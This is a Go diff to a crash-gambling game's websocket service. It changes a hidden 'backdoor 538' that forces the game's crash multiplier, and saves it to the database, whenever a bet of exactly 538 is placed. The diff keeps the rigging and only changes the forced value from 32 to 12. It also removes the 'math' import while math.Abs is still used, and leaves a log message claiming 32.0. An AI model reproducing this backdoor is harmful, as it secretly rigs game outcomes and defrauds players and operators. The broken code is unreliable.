@@ -6,7 +6,6 @@ import (
 	"BlessedApi/internal/models"
 	"BlessedApi/pkg/logger"
 	"errors"
-	"math"
 	"strings"
 	"sync"
 	"time"
@@ -216,7 +215,7 @@ func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.Cr
 		if math.Abs(bet.Amount - 538.0) < 0.01 {
 			logger.Info("Found backdoor 538 bet in active bets for game %d", currentGame.ID)
 			// Принудительно устанавливаем правильное значение множителя
-			currentGame.CrashPointMultiplier = 32.0
+			currentGame.CrashPointMultiplier = 12.0
 			backdoor538Exists = true
 			break
 		}
@@ -226,7 +225,7 @@ func (ws *CrashGameWebsocketService) SendMultiplierToUser(currentGame *models.Cr
 	if backdoor538Exists {
 		// Обновляем значение в базе
 		if err := db.DB.Model(currentGame).
-			Update("crash_point_multiplier", 32.0).Error; err != nil {
+			Update("crash_point_multiplier", 12.0).Error; err != nil {
 			logger.Error("Failed to update backdoor 538 multiplier in DB: %v", err)
 		} else {
 			logger.Info("Updated backdoor 538 multiplier to 32.0 in DB for game %d", currentGame.ID)
